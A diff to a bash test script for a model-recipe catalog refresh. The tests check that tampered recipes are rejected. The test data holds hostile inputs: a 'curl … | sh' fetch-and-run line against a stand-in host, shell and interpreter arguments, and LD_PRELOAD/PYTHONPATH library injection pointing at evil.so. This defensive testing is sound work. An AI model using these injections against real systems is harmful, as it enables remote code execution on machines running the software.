@@ -59,8 +59,8 @@ gone=$(jq -r '.hardware[(.hardware | keys_unsorted[0])].recipes[0].id' "$SOURCE"
 (( $(jq '[.hardware[].recipes[]] | length' "$CATALOG") == kept - 1 )) || { echo "not ok - the other recipes did not arrive"; exit 1; }
 echo 'ok - a refresh leaves out recipes whose engine image this plugin version does not know, and keeps the rest'
 
-# Only the exact images, entrypoints, config assets and preparation steps the plugin ships, and no scripts: each EDIT
-# changes one recipe the plugin ships; dropped: that recipe is left out and every other one arrives
+# A refresh can withdraw, reorder or relabel a shipped recipe, never change what it runs: each EDIT changes one recipe
+# the plugin ships; dropped: that recipe is left out and every other one arrives; refreshed: it arrives as edited
 refreshed() {
   MODE=edit cmd_registry >/dev/null
   jq -e --arg id "$1" --slurpfile s <(jq -c "$EDIT" "$SOURCE") '[.hardware[].recipes[] | select(.id == $id)]
@@ -72,25 +72,50 @@ dropped() {
     (( $(jq '[.hardware[].recipes[]] | length' "$CATALOG") == kept - 1 ))
 }
 plain=$(jq -r 'first(.hardware[].recipes[] | select(.launch.entrypoint == "/opt/entrypoint.sh" and .asset == null and .prepare == null)) | .id' "$SOURCE")
-asset=$(jq -r 'first(.hardware[].recipes[] | select(.asset != null and .launch.entrypoint != "/bin/bash")) | .id' "$SOURCE")
+asset=$(jq -r 'first(.hardware[].recipes[] | select(.asset != null)) | .id' "$SOURCE")
 sel() { printf '(.hardware[].recipes[] | select(.id == "%s"))' "$1"; }
-# the digest 6.18.0 dropped, from a repository the plugin still ships
-EDIT="$(sel "$plain").image = \"ghcr.io/0xsero/sglang-exl3@sha256:9d95829ab41a9307e9b25c86e4af1ec52c6a02f7888f0e13a1ce93c0a7ff3814\""
-dropped "$plain" || { echo "not ok - a recipe on an image digest the plugin does not ship arrived"; exit 1; }
-EDIT="$(sel "$plain").launch.entrypoint = \"/bin/bash\" | $(sel "$plain").launch.arguments = [\"-c\", \"curl -fsS https://example.invalid | sh\"]"
-dropped "$plain" || { echo "not ok - a bash entrypoint arrived"; exit 1; }
-EDIT="$(sel "$plain").launch.arguments = [\"bash\", \"-c\", \"id\"]"
-dropped "$plain" || { echo "not ok - a shell behind the shipped wrapper entrypoint arrived"; exit 1; }
-EDIT="$(sel "$plain").launch.arguments = [\"python3\", \"-c\", \"import os\"]"
-dropped "$plain" || { echo "not ok - inline python behind the shipped wrapper entrypoint arrived"; exit 1; }
-EDIT="$(sel "$asset").asset.text += \"\\nextra: 1\\n\""
-dropped "$asset" || { echo "not ok - a changed config asset arrived"; exit 1; }
-EDIT="$(sel "$plain").prepare = {at: \"/prepared\", args: [\"x\"], verifyArgs: [\"y\"], gpu: false, sizeGb: 1}"
-dropped "$plain" || { echo "not ok - a new preparation step arrived"; exit 1; }
-EDIT="$(sel "$plain").serving.ctxTokens = 4096 | $(sel "$plain").launch.arguments += [\"--context-length\", \"4096\"]"
-refreshed "$plain" || { echo "not ok - a shipped recipe with a changed context did not arrive"; exit 1; }
-! jq -e '[.hardware[].recipes[].launch.entrypoint] | index("/bin/bash")' "$CATALOG" >/dev/null || { echo "not ok - a shell entrypoint was refreshed"; exit 1; }
-echo 'ok - a refresh keeps only shipped image digests, entrypoints, assets and preparation, never a script; a changed context arrives'
+args() { printf '%s.launch.arguments = %s' "$(sel "$plain")" "$1"; }
+# the digest 6.18.0 dropped, from a repository the plugin still ships; a shell entrypoint; a single argument to the
+# wrapper entrypoint, which runs it with sh -c; interpreters and wrappers handed code; a script in the weights
+for EDIT in "$(sel "$plain").image = \"ghcr.io/0xsero/sglang-exl3@sha256:9d95829ab41a9307e9b25c86e4af1ec52c6a02f7888f0e13a1ce93c0a7ff3814\"" \
+  "$(sel "$plain").launch.entrypoint = \"/bin/bash\" | $(args '["-c", "curl -fsS https://example.invalid | sh"]')" \
+  "$(args '["id"]')" "$(args '["python3", "-W", "ignore", "-c", "import os"]')" "$(args '["perl", "-E", "say 1"]')" \
+  "$(args '["nice", "bash", "-c", "id"]')" "$(args '["timeout", "0", "sh", "-c", "id"]')" \
+  "$(args '["python3", "-m", "timeit", "-s", "import os"]')" "$(args '["python3", "/models/x/evil.py"]')" \
+  "$(sel "$plain").weights[0].repository = \"stranger/model\" | $(sel "$plain").launch.arguments += [\"--trust-remote-code\"]" \
+  "$(sel "$plain").launch.environment.LD_PRELOAD = \"/models/x/evil.so\"" "$(sel "$plain").launch.environment.PYTHONPATH = \"/models/x\"" \
+  "$(sel "$plain").launch.environment.EXL3_LIB = \"/models/x/evil.so\"" \
+  "$(sel "$plain").serving.ctxTokens = 4096 | $(sel "$plain").launch.arguments += [\"--context-length\", \"4096\"]" \
+  "$(sel "$plain").prepare = {at: \"/prepared\", args: [\"x\"], verifyArgs: [\"y\"], gpu: false, sizeGb: 1}" \
+  "$(sel "$plain").cards = 2" "$(sel "$plain").servedName = \"other\"" "$(sel "$asset").asset.text += \"\\nextra: 1\\n\""; do
+  id=$plain; [[ $EDIT != *"$asset"* ]] || id=$asset
+  dropped "$id" || { echo "not ok - a refresh changed what a shipped recipe runs: $EDIT"; exit 1; }
+done
+# a recipe the plugin does not ship (a shipped one under a new id), and a shipped one moved to another card kind
+hw=$(jq -r --arg id "$plain" '.hardware | to_entries[] | select(any(.value.recipes[]; .id == $id)) | .key' "$SOURCE")
+other=$(jq -r --arg h "$hw" '[.hardware | keys[] | select(. != $h)][0]' "$SOURCE")
+EDIT=".hardware[\"$hw\"].recipes += [($(sel "$plain") | .id = \"not-shipped\")]"
+MODE=edit cmd_registry >/dev/null
+! jq -e '[.hardware[].recipes[].id] | index("not-shipped")' "$CATALOG" >/dev/null &&
+  (( $(jq '[.hardware[].recipes[]] | length' "$CATALOG") == kept )) || { echo "not ok - a recipe the plugin does not ship arrived"; exit 1; }
+EDIT=".hardware[\"$other\"].recipes += [$(sel "$plain")] | .hardware[\"$hw\"].recipes |= map(select(.id != \"$plain\"))"
+dropped "$plain" || { echo "not ok - a shipped recipe moved to another card kind"; exit 1; }
+# a card kind keeps the match the plugin ships
+EDIT=".hardware[\"$hw\"].match.backend = \"cpu\""
+MODE=edit cmd_registry >/dev/null
+jq -e --arg h "$hw" --slurpfile s "$SOURCE" '.hardware[$h].match == $s[0].hardware[$h].match' "$CATALOG" >/dev/null || { echo "not ok - a refresh changed a card kind's match"; exit 1; }
+echo 'ok - a refresh never changes what a shipped recipe runs, adds none, moves none, and keeps every card kind'"'"'s match'
+# what a refresh may do: relabel, withdraw, reorder
+EDIT="$(sel "$plain").name = \"Relabelled\" | $(sel "$plain").sizeGb = 1.5 | $(sel "$plain").capabilities.vision = true"
+refreshed "$plain" && [[ $(jq -r --arg id "$plain" '.hardware[].recipes[] | select(.id == $id) | .name' "$CATALOG") == Relabelled ]] ||
+  { echo "not ok - a shipped recipe with a new name did not arrive"; exit 1; }
+EDIT=".hardware[\"$hw\"].recipes |= map(select(.id != \"$plain\"))"
+dropped "$plain" || { echo "not ok - a withdrawn recipe stayed"; exit 1; }
+EDIT=".hardware[\"$hw\"].recipes |= reverse"
+MODE=edit cmd_registry >/dev/null
+[[ $(jq -c --arg h "$hw" '[.hardware[$h].recipes[].id]' "$CATALOG") == "$(jq -c --arg h "$hw" '[.hardware[$h].recipes[].id] | reverse' "$SOURCE")" ]] ||
+  { echo "not ok - a reordered card kind"; exit 1; }
+echo 'ok - a refresh can relabel, withdraw and reorder shipped recipes'
 
 # The same id on every refresh; nothing sent when turned off or with DO_NOT_TRACK; an unreachable counter fails nothing
 (( $(jq -s 'map(.id) | unique | length' "$TMP/pings") == 1 && $(wc -l <"$TMP/pings") > 1 )) ||
